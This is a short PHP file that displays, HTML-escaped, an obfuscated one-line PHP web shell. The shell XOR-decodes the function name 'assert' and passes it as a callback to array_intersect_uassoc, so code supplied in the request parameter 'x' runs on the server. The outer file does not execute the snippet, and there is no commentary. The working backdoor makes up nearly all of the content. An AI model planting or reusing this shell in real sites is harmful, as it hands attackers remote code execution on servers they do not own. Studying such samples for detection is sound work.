<?php
$doc = <<<'DOC'
<?php
$fn = pack('H*', '130101170006') ^ 'rrrrrr';
array_intersect_uassoc([$_REQUEST['x'] => ''], [''], $fn);
DOC;
echo htmlspecialchars($doc);
